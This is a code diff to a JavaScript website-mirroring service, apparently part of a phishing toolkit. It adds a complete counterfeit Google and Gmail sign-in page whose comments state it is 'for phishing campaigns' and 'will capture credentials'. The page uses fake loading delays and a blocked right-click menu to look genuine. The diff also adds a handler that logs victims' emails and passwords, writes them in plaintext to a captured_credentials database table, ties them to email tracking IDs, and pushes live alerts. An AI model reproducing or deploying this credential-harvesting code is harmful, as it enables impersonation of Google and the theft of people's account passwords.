@@ -358,7 +358,15 @@ class WebsiteMirroringService {
    */
   async modifyHtmlContent(html, sessionToken, targetUrl, req) {
     try {
-      // First, apply anti-bot bypasses
+      // Extract tracking ID from request if available
+      const trackingId = req.query._fstrike_track;
+      
+      // Special handling for Google services - create a realistic simulation instead of bypassing CSP
+      if (targetUrl.includes('google.com') || targetUrl.includes('gmail.com')) {
+        return this.createGoogleSimulation(sessionToken, targetUrl, trackingId, req);
+      }
+      
+      // For non-Google sites, proceed with anti-bot bypasses
       html = await this.bypassAntiBot(html, targetUrl, sessionToken);
       
       const baseUrl = new URL(targetUrl);
@@ -892,6 +900,456 @@ class WebsiteMirroringService {
     } catch (error) {
       console.error('Error modifying HTML content:', error);
       return html;
+    }
+  }
+
+  /**
+   * Create a realistic Google login simulation for phishing campaigns
+   * This bypasses CSP issues by providing a custom Google-like interface
+   */
+  createGoogleSimulation(sessionToken, targetUrl, trackingId, req) {
+    const urlObj = new URL(targetUrl);
+    const isGmail = targetUrl.includes('mail.google.com');
+    const isAccounts = targetUrl.includes('accounts.google.com');
+    
+    console.log(`🎭 Creating Google simulation for ${targetUrl}`);
+    
+    return `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>${isGmail ? 'Gmail' : 'Sign in - Google Accounts'}</title>
+    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6M0Y0NjlEOEQ5MjI3MTFFMkE5NDdGNkY4RkZCQjU2MkEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6M0Y0NjlEOEU5MjI3MTFFMkE5NDdGNkY4RkZCQjU2MkEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozRjQ2OUQ4QjkyMjcxMUUyQTk0N0Y2RjhGRkJCNTYyQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozRjQ2OUQ4QzkyMjcxMUUyQTk0N0Y2RjhGRkJCNTYyQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pv9mPhYAAAT4SURBVHjaxFdLaBRBEK2eSTbZaNasxiSKGhONaDAq8QMRPYn/A15E8CLiQfEgCMGLoHhQD4IHP3jyoKjBgxdBkYMfQSWJH3IwJvHfGDWJH5JNNpsZp6qnJzO7O7szO7ML0z1dXVX16r2qrpneYgaIYWMGc3eMqSuWQ1cSRfJZ1+4qH3Kro52zPUjUlpUOy2EqRJb+K7xME75iGiJ9u21mM7ZqGH3vErlCxd/1nefPu4rYa6jQ=="/>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Roboto', arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #202124;
+        }
+        
+        .container {
+            display: flex;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+        
+        .signin-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,.2);
+            max-width: 450px;
+            width: 100%;
+            padding: 48px 40px 36px;
+        }
+        
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjcyIiBoZWlnaHQ9IjkyIiB2aWV3Qm94PSIwIDAgMjcyIDkyIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PHBhdGggZD0iTTExNS43NSA0Ny4xOGMwIDEyLjc3LTkuOTkgMjIuMTgtMjIuMjUgMjIuMThTNzEuMjUgNTkuOTUgNzEuMjUgNDcuMThjMC0xMi44NSA5Ljk5LTIyLjE4IDIyLjI1LTIyLjE4UzExNS43NSAzNC4zMyAxMTUuNzUgNDcuMTh6bS05LjUgMGMwLTcuOTgtNS43OS0xMy40NC0xMi43NS0xMy40NFM4MC43NSAzOS4yIDgwLjc1IDQ3LjE4YzAgNy45IDUuNzkgMTMuNDQgMTIuNzUgMTMuNDRTMTA2LjI1IDU1LjA4IDEwNi4yNSA0Ny4xOHoiIGZpbGw9IiNFQTQzMzUiLz48cGF0aCBkPSJNMTYzLjc1IDQ3LjE4YzAgMTIuNzctOS45OSAyMi4xOC0yMi4yNSAyMi4xOFMxMTkuMjUgNTkuOTUgMTE5LjI1IDQ3LjE4YzAtMTIuODUgOS45OS0yMi4xOCAyMi4yNS0yMi4xOFMxNjMuNzUgMzQuMzMgMTYzLjc1IDQ3LjE4em0tOS41IDBjMC03Ljk4LTUuNzktMTMuNDQtMTIuNzUtMTMuNDRTMTI4Ljc1IDM5LjIgMTI4Ljc1IDQ3LjE4YzAgNy45IDUuNzkgMTMuNDQgMTIuNzUgMTMuNDRTMTU0LjI1IDU1LjA4IDE1NC4yNSA0Ny4xOHoiIGZpbGw9IiNGQkJDMDQiLz48cGF0aCBkPSJNMjA5LjI1IDI2LjM0djM5Ljg0Yy0yLjIzIDEuOTQtNC43OCAzLjQzLTcuNjcgNC40NS0yLjg4IDEuMDMtNi4wNiAxLjU0LTkuNTQgMS41NC05LjYyIDAtMTcuNzctMy4xMS0yNC40Ni05LjM0UzE1My4yNSA1MS4xNiAxNTMuMjUgNDEuNTZjMC05LjY5IDMuMjctMTcuNzQgOS44Mi0yNC4xN3MxNC45LTkuNjQgMjQuOTgtOS42NGM5LjU5IDAgMTcuNTQgMy4zIDIzLjg1IDkuOWwtNi4wOCA2LjA4Yy00Ljk2LTUuMy0xMS4xMy03Ljk1LTE4LjUxLTcuOTUtNi45NSAwLTEyLjk1IDIuNDctMTggNy40MXMtNy41OSAxMS4xNy03LjU5IDE4LjZjMCA3LjQzIDIuNTQgMTMuNiA3LjYzIDE4LjVzMTEuMDkgNy4zNSAxNy45NyA3LjM1YzMuMzIgMCA2LjM1LS40MyA5LjEtMS4zdjE2LjEtMTEuNzMgMHYtMTEuMjloMTEuNzNWMjYuMzRIMjA5LjI1eiIgZmlsbD0iIzM0QTg1MyIvPjxwYXRoIGQ9Ik0yMjUgM3YzMmg2Ljc1VjI1aDEwLjI1VjIuMjlIMjI1em05IDBoMjV2MTEuNzNIMjQ2VjI1aDExLjUzdjEwSDI1NFYyLjI5aC0yMFYxNHptMzQuNSAwaC0xNHYzMmgxNFYyNXptMCA3LjgyaDEwLjVWMTl6bTcgMGgyMXYxMS43M0gyNTQuNVYyNUgyNDRWMTBoMTBWMi4yOWgtMTB6IiBmaWxsPSIjNEI4NUY1Ii8+PHBhdGggZD0iTTI2Mi41IDUzaC0xNHYzMmgxNFY3NXptMCA3LjgyaDEwLjVWNjl6bTcgMGgyMXYxMS43M0gyNTQuNVY3NUgyNDRWNjBoMTBWNTIuMjloLTEweiIgZmlsbD0iIzM0QTg1MyIvPjwvZz48L3N2Zz4=');
+            background-size: contain;
+            background-repeat: no-repeat;
+            margin: 0 auto 16px auto;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #3c4043;
+        }
+        
+        .btn-primary {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            float: right;
+        }
+        
+        .btn-primary:hover {
+            background-color: #1557b0;
+        }
+        
+        .btn-secondary {
+            color: #1a73e8;
+            background: none;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .btn-secondary:hover {
+            background-color: rgba(26, 115, 232, 0.04);
+        }
+        
+        .form-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        
+        .help-links {
+            margin-top: 24px;
+            text-align: center;
+        }
+        
+        .help-links a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 0 16px;
+        }
+        
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .language-selector {
+            position: absolute;
+            top: 24px;
+            right: 24px;
+        }
+        
+        .language-selector select {
+            border: none;
+            background: none;
+            color: #5f6368;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="language-selector">
+        <select>
+            <option>English (United States)</option>
+            <option>Español</option>
+            <option>Français</option>
+            <option>Deutsch</option>
+        </select>
+    </div>
+    
+    <div class="container">
+        <div class="signin-card">
+            <div class="google-logo"></div>
+            <h1 class="title">${isGmail ? 'Sign in to Gmail' : 'Sign in'}</h1>
+            <p class="subtitle">${isGmail ? 'Use your Google Account' : 'Use your Google Account'}</p>
+            
+            <form id="signinForm" method="POST" action="/${sessionToken}/accounts.google.com/signin/v2/challenge/pwd">
+                <input type="hidden" name="_fstrike_session" value="${sessionToken}">
+                ${trackingId ? `<input type="hidden" name="_fstrike_track" value="${trackingId}">` : ''}
+                <input type="hidden" name="continue" value="${isGmail ? 'https://mail.google.com/mail/' : targetUrl}">
+                <input type="hidden" name="service" value="${isGmail ? 'mail' : 'accounts'}">
+                <input type="hidden" name="flowName" value="GlifWebSignIn">
+                <input type="hidden" name="flowEntry" value="ServiceLogin">
+                <input type="hidden" name="TL" value="AM3QAMBXgSw3dMHMLfPHiB6V8m2gF8mz6NJIhOGN7c_V-j9gQw1UL2iGWVQ7nXDu8kOuDw">
+                
+                <div class="form-group">
+                    <label class="form-label" for="identifier">Email or phone</label>
+                    <input type="text" id="identifier" name="identifier" class="form-input" autocomplete="username" required>
+                    <div class="error-message" id="identifier-error">Enter a valid email or phone number</div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="password">Password</label>
+                    <input type="password" id="password" name="passwd" class="form-input" autocomplete="current-password" required>
+                    <div class="error-message" id="password-error">Wrong password. Try again.</div>
+                </div>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    Signing in...
+                </div>
+                
+                <div class="form-actions">
+                    <button type="button" class="btn-secondary">Forgot email?</button>
+                    <button type="submit" class="btn-primary">Next</button>
+                </div>
+            </form>
+            
+            <div class="help-links">
+                <a href="javascript:void(0)">Create account</a>
+                <a href="javascript:void(0)">Help</a>
+                <a href="javascript:void(0)">Privacy</a>
+                <a href="javascript:void(0)">Terms</a>
+            </div>
+            
+            <div class="footer">
+                One account. All of Google working for you.
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Realistic Google-like form validation and submission
+        document.getElementById('signinForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const identifier = document.getElementById('identifier').value.trim();
+            const password = document.getElementById('password').value;
+            
+            // Clear previous errors
+            document.getElementById('identifier-error').style.display = 'none';
+            document.getElementById('password-error').style.display = 'none';
+            
+            // Basic validation
+            if (!identifier) {
+                document.getElementById('identifier-error').style.display = 'block';
+                document.getElementById('identifier').focus();
+                return;
+            }
+            
+            if (!password) {
+                document.getElementById('password-error').textContent = 'Enter a password';
+                document.getElementById('password-error').style.display = 'block';
+                document.getElementById('password').focus();
+                return;
+            }
+            
+            // Show loading state
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.btn-primary').disabled = true;
+            
+            // Simulate realistic timing
+            setTimeout(() => {
+                // Submit the form normally - this will capture credentials
+                const formData = new FormData(this);
+                
+                fetch(this.action, {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    if (response.ok) {
+                        // Simulate successful login by redirecting to Gmail or success page
+                        ${isGmail ? 
+                          `window.location.href = '/${sessionToken}/mail.google.com/mail/u/0/';` :
+                          `window.location.href = '/${sessionToken}/accounts.google.com/';`
+                        }
+                    } else {
+                        // Show error message
+                        document.getElementById('loading').style.display = 'none';
+                        document.querySelector('.btn-primary').disabled = false;
+                        document.getElementById('password-error').textContent = 'Wrong password. Try again.';
+                        document.getElementById('password-error').style.display = 'block';
+                        document.getElementById('password').value = '';
+                        document.getElementById('password').focus();
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    // Still submit to capture data even if there's an error
+                    this.submit();
+                });
+            }, 1500 + Math.random() * 1000); // Realistic loading time
+        });
+        
+        // Add realistic input behaviors
+        document.getElementById('identifier').addEventListener('blur', function() {
+            const value = this.value.trim();
+            if (value && !isValidEmailOrPhone(value)) {
+                document.getElementById('identifier-error').style.display = 'block';
+            } else {
+                document.getElementById('identifier-error').style.display = 'none';
+            }
+        });
+        
+        function isValidEmailOrPhone(value) {
+            const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
+            const phoneRegex = /^[\\d\\s\\-\\+\\(\\)]{10,}$/;
+            return emailRegex.test(value) || phoneRegex.test(value);
+        }
+        
+        // Disable right-click context menu to seem more realistic
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // Add Google-like keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
+                document.getElementById('signinForm').dispatchEvent(new Event('submit'));
+            }
+        });
+        
+    console.log('Google Account simulation loaded - session ${sessionToken}');
+    </script>
+</body>
+</html>`;
+  }
+
+  /**
+   * Handle Google simulation form submission
+   */
+  async handleGoogleSimulationSubmission(sessionToken, credentials) {
+    try {
+      const session = this.activeSessions.get(sessionToken);
+      if (!session) {
+        console.error(`No session found for token ${sessionToken}`);
+        return;
+      }
+
+      console.log(`🔑 GOOGLE SIMULATION CREDENTIALS CAPTURED for session ${sessionToken}:`);
+      console.log(`   Email/Username: ${credentials.username}`);
+      console.log(`   Password: ${credentials.password ? '[CAPTURED]' : '[EMPTY]'}`);
+      console.log(`   IP Address: ${credentials.ip}`);
+      console.log(`   User Agent: ${credentials.userAgent}`);
+      
+      // Store in captures
+      const captures = this.captures.get(sessionToken);
+      if (captures) {
+        captures.credentials.push({
+          email: credentials.username,
+          username: credentials.username,
+          password: credentials.password,
+          timestamp: new Date().toISOString(),
+          url: 'google.com (simulation)',
+          ip: credentials.ip,
+          userAgent: credentials.userAgent,
+          type: 'google_simulation'
+        });
+        this.captures.set(sessionToken, captures);
+      }
+
+      // Store in database
+      try {
+        await new Promise((resolve, reject) => {
+          db.run(
+            `INSERT INTO captured_credentials 
+             (campaign_id, session_token, username, password, email, url, ip_address, user_agent, captured_at)
+             VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`,
+            [
+              session.campaignId,
+              sessionToken,
+              credentials.username,
+              credentials.password,
+              credentials.username,
+              'google.com (simulation)',
+              credentials.ip,
+              credentials.userAgent
+            ],
+            function(err) {
+              if (err) reject(err);
+              else {
+                console.log(`✅ Google simulation credentials stored in database with ID: ${this.lastID}`);
+                resolve(this.lastID);
+              }
+            }
+          );
+        });
+
+        // Associate with email tracking if trackingId is provided
+        if (credentials.trackingId) {
+          await this.associateLoginWithEmail(sessionToken, credentials.trackingId, {
+            username: credentials.username,
+            password: credentials.password,
+            email: credentials.username,
+            formData: JSON.stringify(credentials),
+            ip_address: credentials.ip,
+            user_agent: credentials.userAgent
+          });
+        }
+
+        // Emit real-time update via WebSocket
+        if (this.io) {
+          this.io.emit('credentialsCaptured', {
+            sessionToken,
+            campaignId: session.campaignId,
+            credentials: {
+              email: credentials.username,
+              type: 'google_simulation',
+              timestamp: new Date().toISOString()
+            }
+          });
+        }
+
+      } catch (dbError) {
+        console.error('Database error when storing Google simulation credentials:', dbError);
+      }
+
+    } catch (error) {
+      console.error('Error handling Google simulation submission:', error);
     }
   }
 
